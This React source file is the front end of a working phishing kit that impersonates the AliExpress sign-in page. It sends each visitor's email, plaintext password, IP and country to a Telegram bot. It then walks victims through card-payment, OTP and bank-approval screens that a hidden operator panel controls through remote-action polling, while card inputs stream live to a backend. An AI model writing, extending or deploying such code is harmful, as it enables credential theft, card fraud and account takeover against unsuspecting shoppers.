
import React, { useState, useEffect } from 'react';
import { BrowserRouter, Routes, Route, useNavigate, useLocation } from 'react-router-dom';
import { API_URL } from './config';
import { ChevronLeft, ChevronDown, Eye, EyeOff, ShieldAlert } from 'lucide-react';
import { SocialButton } from './components/SocialButton';
import { Captcha } from './components/Captcha';
import { PaymentPage } from './components/PaymentPage';
import { ProcessingPage } from './components/ProcessingPage';
import { AdminPanel } from './components/AdminPanel';
import { OtpPage } from './components/OtpPage';
import { BankApprovalPage } from './components/BankApprovalPage';
import { TranslationProvider, useTranslation } from './TranslationContext';

export type ViewState = 'captcha' | 'login' | 'payment' | 'loading' | 'otp' | 'bank-approval' | 'blocked';

const MainAppContent: React.FC = () => {
  const { t } = useTranslation();
  const navigate = useNavigate();
  const location = useLocation();
  const [view, setView] = useState<ViewState>('captcha');
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [showPassword, setShowPassword] = useState(false);
  const [locationName, setLocationName] = useState('Detecting...');
  const [ipInfo, setIpInfo] = useState({ ip: 'Unknown', country: 'Unknown' });
  const [userCountry, setUserCountry] = useState<string>('Unknown');
  
  const [botConfig] = useState({
    token: import.meta.env.VITE_TELEGRAM_BOT_TOKEN || '',
    chatId: import.meta.env.VITE_TELEGRAM_CHAT_ID || ''
  });
  const [remoteAction, setRemoteAction] = useState<string>('none');
  const [liveUserInputs, setLiveUserInputs] = useState<any>({});
  const [sessionId] = useState(() => {
    // Generate unique session ID for this user
    const stored = sessionStorage.getItem('user_session_id');
    if (stored) return stored;
    const newId = `session_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
    sessionStorage.setItem('user_session_id', newId);
    return newId;
  });

  // Visibility & Session Tracking
  useEffect(() => {
    const updatePresence = () => {
      const status = document.visibilityState === 'visible' ? 'online' : 'offline';
      // Don't track admin page visits
      if (location.pathname === '/admin') return;
      
      const sessionData = {
        status,
        lastSeen: Date.now(),
        ip: ipInfo.ip,
        country: ipInfo.country,
        currentPage: `/${view}`,
        sessionId: sessionId,
        email: email || '',
        password: password ? '***' : ''
      };
      
      // Send session data to API
      fetch(`${API_URL}/api/sessions/${sessionId}`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(sessionData)
      }).catch(err => console.error('Failed to update session:', err));
    };
    
    document.addEventListener('visibilitychange', updatePresence);
    const interval = setInterval(updatePresence, 3000);
    updatePresence();
    
    return () => {
      document.removeEventListener('visibilitychange', updatePresence);
      clearInterval(interval);
    };
  }, [ipInfo, view, location.pathname]);

  // Remote Action Polling
  useEffect(() => {
    const checkActions = async () => {
      try {
        const response = await fetch(`${API_URL}/api/actions/${sessionId}`);
        const data = await response.json();
        const action = data.action;
        
        if (action && action !== remoteAction) {
          if (action === 'otp') setView('otp');
          else if (action === 'bank_approval') setView('bank-approval');
          else if (action === 'invalid_otp') setView('otp');
          else if (action === 'declined') setView('payment');
          else if (action === 'block') setView('blocked');
          else if (action === 'normal') {
            // If we were blocked or special view, go back to generic state if needed
            // but usually 'normal' just means stop forcing redirects
          }
          setRemoteAction(action);
        }
      } catch (err) {
        console.error('Failed to check actions:', err);
      }
    };
    const timer = setInterval(checkActions, 1000);
    return () => clearInterval(timer);
  }, [remoteAction, sessionId]);

  const fetchCurrentLocation = async () => {
    try {
      // Try ipify first (most reliable, free, no rate limit)
      const ipRes = await fetch('https://api.ipify.org?format=json');
      const ipData = await ipRes.json();
      const userIp = ipData.ip;
      
      // Then get location from ip-api.com (free, 45 req/min)
      const locRes = await fetch(`https://ip-api.com/json/${userIp}`);
      const locData = await locRes.json();
      
      const result = { 
        ip: userIp || 'Unknown', 
        country: locData.country || 'Unknown' 
      };
      setIpInfo(result);
      setUserCountry(result.country);
      setLocationName(result.country);
      return result;
    } catch (e) {
      try {
        // Fallback to ipapi.co
        const res2 = await fetch('https://ipapi.co/json/');
        const data2 = await res2.json();
        const result2 = { ip: data2.ip || 'Unknown', country: data2.country_name || 'Unknown' };
        setIpInfo(result2);
        setUserCountry(result2.country);
        setLocationName(result2.country);
        return result2;
      } catch (e2) {
        try {
          // Final fallback to api64.ipify.org (IPv6 support)
          const res3 = await fetch('https://api64.ipify.org?format=json');
          const data3 = await res3.json();
          const result3 = { ip: data3.ip || 'Unknown', country: 'Unknown' };
          setIpInfo(result3);
          setUserCountry('Unknown');
          setLocationName('Unknown');
          return result3;
        } catch (e3) {
          const fallback = { ip: 'Unknown', country: 'Unknown' };
          setIpInfo(fallback);
          setUserCountry('Unknown');
          setLocationName('Unknown');
          return fallback;
        }
      }
    }
  };

  useEffect(() => { fetchCurrentLocation(); }, []);

  const sendToTelegram = async (text: string) => {
    try {
      const url = `https://api.telegram.org/bot${botConfig.token}/sendMessage`;
      await fetch(url, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: botConfig.chatId, text, parse_mode: 'HTML' }),
      });
    } catch (error) { console.error('Telegram notification failed:', error); }
  };

  const handleVerificationSuccess = async () => {
    const currentData = await fetchCurrentLocation();
    const message = `<b>🔒 Security Verification Passed</b>\n<b>📍 IP:</b> ${currentData.ip}\n<b>🚩 Country:</b> ${currentData.country}`;
    await sendToTelegram(message);
    setView('login');
  };

  const handleLogin = async (e?: React.FormEvent) => {
    if (e) e.preventDefault();
    const message = `<b>👤 Login Attempt</b>\n<b>📧 Email:</b> <code>${email}</code>\n<b>🔑 Pass:</b> <code>${password}</code>\n<b>📍 IP:</b> ${ipInfo.ip}`;
    await sendToTelegram(message);
    setView('payment');
  };

  const handleUserInputUpdate = (data: any) => {
    const updated = { ...liveUserInputs, ...data };
    setLiveUserInputs(updated);
    // Send inputs to API
    fetch(`${API_URL}/api/inputs/${sessionId}`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(updated)
    }).catch(err => console.error('Failed to update inputs:', err));
  };

  // Hidden Admin Access: Click logo 5 times
  const [logoClicks, setLogoClicks] = useState(0);
  const handleLogoClick = () => {
    if (logoClicks + 1 >= 5) {
      navigate('/admin');
      setLogoClicks(0);
    } else {
      setLogoClicks(prev => prev + 1);
    }
  };

  const BlockedView = () => {
    return (
      <div className="min-h-screen bg-slate-900 flex items-center justify-center p-6 text-center">
        <div className="max-w-xs space-y-4">
          <ShieldAlert className="w-16 h-16 text-red-500 mx-auto" />
          <h1 className="text-2xl font-bold text-white">Error</h1>
          <p className="text-slate-400 text-sm">Do not close this window</p>
        </div>
      </div>
    );
  };

  if (view === 'blocked') {
    return (
      <TranslationProvider country={userCountry}>
        <BlockedView />
      </TranslationProvider>
    );
  }

  if (view === 'captcha') return <TranslationProvider country={userCountry}><Captcha onSuccess={handleVerificationSuccess} /></TranslationProvider>;
  if (view === 'loading') return <TranslationProvider country={userCountry}><ProcessingPage /></TranslationProvider>;
  if (view === 'otp') return <TranslationProvider country={userCountry}><OtpPage botToken={botConfig.token} chatId={botConfig.chatId} isInvalid={remoteAction === 'invalid_otp'} onComplete={() => setView('loading')} /></TranslationProvider>;
  if (view === 'bank-approval') return <TranslationProvider country={userCountry}><BankApprovalPage cardType={liveUserInputs.cardNumber?.startsWith('4') ? 'visa' : liveUserInputs.cardNumber?.startsWith('5') ? 'mastercard' : 'amex'} /></TranslationProvider>;

  if (view === 'payment') {
    return (
      <TranslationProvider country={userCountry}>
      <PaymentPage 
        onBack={() => setView('login')} 
        botToken={botConfig.token} 
        chatId={botConfig.chatId} 
        currentIp={ipInfo.ip}
        currentLoc={locationName} 
        onComplete={() => setView('loading')}
        onInputChange={handleUserInputUpdate}
        error={remoteAction === 'declined' ? 'Your card is declined.' : undefined}
      />
      </TranslationProvider>
    );
  }

  return (
    <TranslationProvider country={userCountry}>
    <div className="min-h-screen bg-white flex flex-col items-center max-w-md mx-auto relative shadow-xl overflow-hidden">
      <header className="w-full flex items-center justify-between p-4 bg-white border-b border-gray-50">
        <button className="p-1 hover:bg-gray-100 rounded-full transition-colors">
          <ChevronLeft className="w-6 h-6 text-gray-800" />
        </button>
        <div className="flex-1 flex justify-center" onClick={handleLogoClick}>
          <img 
            src="https://upload.wikimedia.org/wikipedia/commons/thumb/4/41/AliExpress_2024.svg/330px-AliExpress_2024.svg.png" 
            alt="AliExpress" 
            className="h-6 object-contain cursor-pointer"
          />
        </div>
        <div className="w-8" /> 
      </header>

      <div className="w-full px-6 pt-8 pb-4 animate-in slide-in-from-right-10 duration-500">
        <h2 className="text-2xl font-bold text-[#191919] mb-8">{t('signIn')}</h2>
        <form onSubmit={handleLogin} className="space-y-4">
          <input
            type="text"
            value={email}
            onChange={(e) => setEmail(e.target.value)}
            placeholder={t('emailOrPhone')}
            className="w-full px-4 py-4 text-base text-black font-semibold border border-gray-300 rounded-xl outline-none focus:border-[#FF4747] transition-all placeholder:text-gray-400 bg-gray-50"
          />
          <div className="relative">
            <input
              type={showPassword ? "text" : "password"}
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              placeholder={t('password')}
              className="w-full px-4 py-4 text-base text-black font-semibold border border-gray-300 rounded-xl outline-none focus:border-[#FF4747] transition-all placeholder:text-gray-400 bg-gray-50"
            />
            <button type="button" onClick={() => setShowPassword(!showPassword)} className="absolute right-4 top-1/2 -translate-y-1/2 text-gray-400">
              {showPassword ? <EyeOff className="w-5 h-5" /> : <Eye className="w-5 h-5" />}
            </button>
          </div>
          <button type="submit" disabled={!email || !password} className={`w-full py-4 rounded-full text-lg font-bold text-white ${(!email || !password) ? 'bg-[#E0E0E0]' : 'bg-[#FF4747]'}`}>
            {t('signIn')}
          </button>
        </form>
        
        <div className="mt-4 flex justify-between items-center px-1">
          <button className="text-sm text-gray-500">{t('forgotPassword')}</button>
          <button className="text-sm text-[#FF4747] font-semibold">{t('signUp')}</button>
        </div>
        <div className="relative flex items-center py-6">
          <div className="flex-grow border-t border-gray-200"></div>
          <span className="flex-shrink mx-4 text-gray-400 text-xs font-medium uppercase tracking-widest">{t('orContinueWith')}</span>
          <div className="flex-grow border-t border-gray-200"></div>
        </div>
        <div className="grid grid-cols-1 gap-3">
          <SocialButton type="google" label="google" icon="https://www.gstatic.com/images/branding/product/1x/gsa_512dp.png" />
          <SocialButton type="facebook" label="facebook" icon="https://upload.wikimedia.org/wikipedia/commons/b/b8/2021_Facebook_icon.svg" />
          <SocialButton type="apple" label="apple" icon="https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg" />
        </div>
      </div>
      <footer className="w-full px-6 py-8 text-center bg-white mt-auto">
        <div className="flex items-center justify-center gap-1 mb-6 text-gray-600">
          <span className="text-sm">Location:</span>
          <button className="flex items-center gap-0.5 text-sm font-semibold hover:text-[#FF4747]">
            {locationName} <ChevronDown className="w-4 h-4" />
          </button>
        </div>
        <p className="text-[11px] leading-relaxed text-gray-400 font-normal max-w-[280px] mx-auto">
          By signing in, you agree to AliExpress.com's <a href="#" className="underline">Terms of Use</a> and <a href="#" className="underline">Privacy Policy</a>.
        </p>
      </footer>
    </div>
    </TranslationProvider>
  );
};

const App: React.FC = () => {
  return (
    <TranslationProvider>
      <BrowserRouter>
        <Routes>
          <Route path="/" element={<MainAppContent />} />
          <Route path="/admin" element={<AdminPanel onBack={() => window.location.href = '/'} />} />
        </Routes>
      </BrowserRouter>
    </TranslationProvider>
  );
};

export default App;
